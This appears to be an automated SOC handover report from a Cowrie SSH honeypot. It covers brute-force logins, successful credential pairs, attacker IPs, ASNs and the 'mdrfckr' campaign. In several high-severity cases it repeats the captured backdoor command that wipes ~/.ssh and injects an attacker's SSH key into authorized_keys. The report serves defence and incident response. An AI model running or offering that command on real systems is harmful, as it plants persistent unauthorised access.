# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-13 |
| **Generated At** | 2026-06-13T21:21:28Z |
| **Shift Time** | 21:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **153** |
| Confirmed Threats | **124** |
| False Positives Filtered | **29** (18.9%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **12** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **141** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **62** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **37** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 6 |
| `ubuntu` | 2 |
| `sarah` | 2 |
| `kia` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 13 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `sarah123` | 2 |
| `sitemap123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `sarah` | `sarah123` | 2 |
| `kia` | `123456` | 2 |
| `signin` | `123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `vps@1234` | `47.75.109.229` | 2026-06-13T19:42:23 |
| `root` | `3245gs5662d34` | `47.75.109.229` | 2026-06-13T19:42:26 |
| `root` | `tianyu@123` | `47.75.109.229` | 2026-06-13T19:43:48 |
| `root` | `Admin@123!` | `47.75.109.229` | 2026-06-13T19:49:36 |
| `root` | `quest` | `47.75.109.229` | 2026-06-13T19:51:02 |
| `root` | `ZAQ123wsx` | `186.68.83.104` | 2026-06-13T20:11:38 |
| `root` | `3245gs5662d34` | `186.68.83.104` | 2026-06-13T20:11:45 |
| `root` | `amaterasu` | `103.172.236.241` | 2026-06-13T20:26:49 |
| `root` | `3245gs5662d34` | `103.172.236.241` | 2026-06-13T20:26:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **153** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 63 |
| Nmap scanner | 16 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 62 | 9 |
| `e788c657d1a2...` | Mirai/variant | 2 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 62 | 9 | Mirai/variant |
| `95420f9d932d...` | Nmap scanner | 14 | 2 | — |
| `e788c657d1a2...` | Nmap scanner | 2 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.172.236.241`, `186.68.83.104`, `47.75.109.229`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **19** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS51167` | Contabo GmbH | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS140527` | China Telecom | 1 | HIGH |
| `AS264439` | OuriNet TELECOM | 1 | HIGH |
| `AS14522` | SERVICIOS DE TELECOMUNICACIONES SETEL S.A. (XTRIM EC) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2ffe0486d5cd

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:42 |
| **Last Seen** | 2026-06-13 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:42:22` | `cowrie.session.connect` |
| `2026-06-13 19:42:22` | `cowrie.client.version` |
| `2026-06-13 19:42:22` | `cowrie.client.kex` |
| `2026-06-13 19:42:23` | `cowrie.login.success` |
| `2026-06-13 19:42:23` | `cowrie.session.params` |
| `2026-06-13 19:42:23` | `cowrie.command.input` |
| `2026-06-13 19:42:23` | `cowrie.command.failed` |
| `2026-06-13 19:42:23` | `cowrie.log.closed` |
| `2026-06-13 19:42:23` | `cowrie.session.params` |
| `2026-06-13 19:42:23` | `cowrie.command.input` |
| `2026-06-13 19:42:23` | `cowrie.session.file_download` |
| `2026-06-13 19:42:23` | `cowrie.log.closed` |
| `2026-06-13 19:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2a10f89348

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:42 |
| **Last Seen** | 2026-06-13 19:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:42:25` | `cowrie.session.connect` |
| `2026-06-13 19:42:25` | `cowrie.client.version` |
| `2026-06-13 19:42:25` | `cowrie.client.kex` |
| `2026-06-13 19:42:26` | `cowrie.login.success` |
| `2026-06-13 19:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0407a14ad23

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:43 |
| **Last Seen** | 2026-06-13 19:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:43:47` | `cowrie.session.connect` |
| `2026-06-13 19:43:47` | `cowrie.client.version` |
| `2026-06-13 19:43:48` | `cowrie.client.kex` |
| `2026-06-13 19:43:48` | `cowrie.login.success` |
| `2026-06-13 19:43:49` | `cowrie.session.params` |
| `2026-06-13 19:43:49` | `cowrie.command.input` |
| `2026-06-13 19:43:49` | `cowrie.command.failed` |
| `2026-06-13 19:43:49` | `cowrie.log.closed` |
| `2026-06-13 19:43:49` | `cowrie.session.params` |
| `2026-06-13 19:43:49` | `cowrie.command.input` |
| `2026-06-13 19:43:49` | `cowrie.session.file_download` |
| `2026-06-13 19:43:49` | `cowrie.log.closed` |
| `2026-06-13 19:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcffcf87b709

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:43 |
| **Last Seen** | 2026-06-13 19:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:43:51` | `cowrie.session.connect` |
| `2026-06-13 19:43:51` | `cowrie.client.version` |
| `2026-06-13 19:43:51` | `cowrie.client.kex` |
| `2026-06-13 19:43:52` | `cowrie.login.success` |
| `2026-06-13 19:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b82ccbb9fc45

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:49 |
| **Last Seen** | 2026-06-13 19:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:49:35` | `cowrie.session.connect` |
| `2026-06-13 19:49:35` | `cowrie.client.version` |
| `2026-06-13 19:49:35` | `cowrie.client.kex` |
| `2026-06-13 19:49:36` | `cowrie.login.success` |
| `2026-06-13 19:49:36` | `cowrie.session.params` |
| `2026-06-13 19:49:36` | `cowrie.command.input` |
| `2026-06-13 19:49:36` | `cowrie.command.failed` |
| `2026-06-13 19:49:36` | `cowrie.log.closed` |
| `2026-06-13 19:49:36` | `cowrie.session.params` |
| `2026-06-13 19:49:36` | `cowrie.command.input` |
| `2026-06-13 19:49:37` | `cowrie.session.file_download` |
| `2026-06-13 19:49:37` | `cowrie.log.closed` |
| `2026-06-13 19:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6866a48fd0c7

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:49 |
| **Last Seen** | 2026-06-13 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:49:39` | `cowrie.session.connect` |
| `2026-06-13 19:49:39` | `cowrie.client.version` |
| `2026-06-13 19:49:39` | `cowrie.client.kex` |
| `2026-06-13 19:49:39` | `cowrie.login.success` |
| `2026-06-13 19:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445829347b86

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:51 |
| **Last Seen** | 2026-06-13 19:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:51:02` | `cowrie.session.connect` |
| `2026-06-13 19:51:02` | `cowrie.client.version` |
| `2026-06-13 19:51:02` | `cowrie.client.kex` |
| `2026-06-13 19:51:02` | `cowrie.login.success` |
| `2026-06-13 19:51:03` | `cowrie.session.params` |
| `2026-06-13 19:51:03` | `cowrie.command.input` |
| `2026-06-13 19:51:03` | `cowrie.command.failed` |
| `2026-06-13 19:51:03` | `cowrie.log.closed` |
| `2026-06-13 19:51:03` | `cowrie.session.params` |
| `2026-06-13 19:51:03` | `cowrie.command.input` |
| `2026-06-13 19:51:03` | `cowrie.session.file_download` |
| `2026-06-13 19:51:03` | `cowrie.log.closed` |
| `2026-06-13 19:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19047ec0e3d3

| Field | Detail |
|---|---|
| **Source IP** | `47.75.109[.]229` |
| **First Seen** | 2026-06-13 19:51 |
| **Last Seen** | 2026-06-13 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 19:51:06` | `cowrie.session.connect` |
| `2026-06-13 19:51:06` | `cowrie.client.version` |
| `2026-06-13 19:51:06` | `cowrie.client.kex` |
| `2026-06-13 19:51:06` | `cowrie.login.success` |
| `2026-06-13 19:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.75.109[.]229` to AbuseIPDB if not already reported
- [ ] Block `47.75.109[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e1e9828ba6

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-06-13 20:11 |
| **Last Seen** | 2026-06-13 20:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 20:11:36` | `cowrie.session.connect` |
| `2026-06-13 20:11:36` | `cowrie.client.version` |
| `2026-06-13 20:11:37` | `cowrie.client.kex` |
| `2026-06-13 20:11:38` | `cowrie.login.success` |
| `2026-06-13 20:11:39` | `cowrie.session.params` |
| `2026-06-13 20:11:39` | `cowrie.command.input` |
| `2026-06-13 20:11:39` | `cowrie.command.failed` |
| `2026-06-13 20:11:39` | `cowrie.log.closed` |
| `2026-06-13 20:11:39` | `cowrie.session.params` |
| `2026-06-13 20:11:39` | `cowrie.command.input` |
| `2026-06-13 20:11:40` | `cowrie.session.file_download` |
| `2026-06-13 20:11:40` | `cowrie.log.closed` |
| `2026-06-13 20:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26fa92b57ba

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-06-13 20:11 |
| **Last Seen** | 2026-06-13 20:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 20:11:43` | `cowrie.session.connect` |
| `2026-06-13 20:11:43` | `cowrie.client.version` |
| `2026-06-13 20:11:43` | `cowrie.client.kex` |
| `2026-06-13 20:11:45` | `cowrie.login.success` |
| `2026-06-13 20:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2723438a69a9

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-06-13 20:26 |
| **Last Seen** | 2026-06-13 20:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 20:26:48` | `cowrie.session.connect` |
| `2026-06-13 20:26:48` | `cowrie.client.version` |
| `2026-06-13 20:26:49` | `cowrie.client.kex` |
| `2026-06-13 20:26:49` | `cowrie.login.success` |
| `2026-06-13 20:26:50` | `cowrie.session.params` |
| `2026-06-13 20:26:50` | `cowrie.command.input` |
| `2026-06-13 20:26:50` | `cowrie.command.failed` |
| `2026-06-13 20:26:50` | `cowrie.log.closed` |
| `2026-06-13 20:26:51` | `cowrie.session.params` |
| `2026-06-13 20:26:51` | `cowrie.command.input` |
| `2026-06-13 20:26:51` | `cowrie.session.file_download` |
| `2026-06-13 20:26:51` | `cowrie.log.closed` |
| `2026-06-13 20:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda898065de4

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-06-13 20:26 |
| **Last Seen** | 2026-06-13 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 20:26:54` | `cowrie.session.connect` |
| `2026-06-13 20:26:54` | `cowrie.client.version` |
| `2026-06-13 20:26:54` | `cowrie.client.kex` |
| `2026-06-13 20:26:55` | `cowrie.login.success` |
| `2026-06-13 20:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.230.150[.]187` | **38** | 2026-06-13 19:43 | 2026-06-13 21:19 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `148.153.188[.]246` | **16** | 2026-06-13 20:42 | 2026-06-13 20:43 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `47.75.109[.]229` | **14** | 2026-06-13 19:42 | 2026-06-13 19:51 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.25.158[.]74` | **12** | 2026-06-13 20:57 | 2026-06-13 21:19 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `62.171.168[.]158` | **10** | 2026-06-13 20:56 | 2026-06-13 21:19 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `201.55.113[.]122` | **5** | 2026-06-13 20:56 | 2026-06-13 21:09 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `36.95.221[.]140` | **4** | 2026-06-13 20:09 | 2026-06-13 20:22 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `168.144.95[.]137` | **2** | 2026-06-13 20:56 | 2026-06-13 21:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.171.28[.]177` | **2** | 2026-06-13 21:02 | 2026-06-13 21:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.172.236[.]241` | 1 | 2026-06-13 20:26 | 2026-06-13 20:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.114[.]161` | 1 | 2026-06-13 20:25 | 2026-06-13 20:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.33[.]21` | 1 | 2026-06-13 20:06 | 2026-06-13 20:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `131.221.236[.]23` | 1 | 2026-06-13 20:04 | 2026-06-13 20:05 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.147.205[.]219` | 1 | 2026-06-13 21:00 | 2026-06-13 21:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `186.68.83[.]104` | 1 | 2026-06-13 20:11 | 2026-06-13 20:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.136.88[.]112` | 1 | 2026-06-13 20:06 | 2026-06-13 20:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.247.218[.]112` | 1 | 2026-06-13 20:23 | 2026-06-13 20:24 | 49s | 0 | `T1592` | 🟢 LOW |
